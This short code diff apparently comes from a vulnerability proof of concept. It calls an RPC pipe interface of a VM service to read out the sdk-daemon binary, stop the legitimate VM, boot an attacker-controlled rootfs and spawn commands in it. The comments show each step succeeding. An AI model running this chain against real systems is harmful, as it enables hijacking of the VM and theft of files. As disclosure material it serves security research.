@@ -1,0 +1,19 @@
+// Step 1: Extract sdk-daemon (8 MB, ELF 64-bit)
+send_rpc(pipe, "readFile",
+    "\"path\":\"/usr/local/bin/sdk-daemon\"");
+// Response: 11,032,199 bytes in base64
+
+// Step 2: Stop legitimate VM
+send_rpc(pipe, "stopVM", "");
+
+// Step 3: Boot with our rootfs
+send_rpc(pipe, "startVM",
+    "\"bundlePath\":\"C:\\\\Users\\\\attacker\\\\custom_vm\"");
+// {"success":true}
+
+// Step 4: Verify our VM is running
+send_rpc(pipe, "isGuestConnected", "");
+// {"connected":true}
+
+// Step 5: Execute in our VM
+send_rpc(pipe, "spawn", "\"cmd\":\"cat /etc/os-release\"");
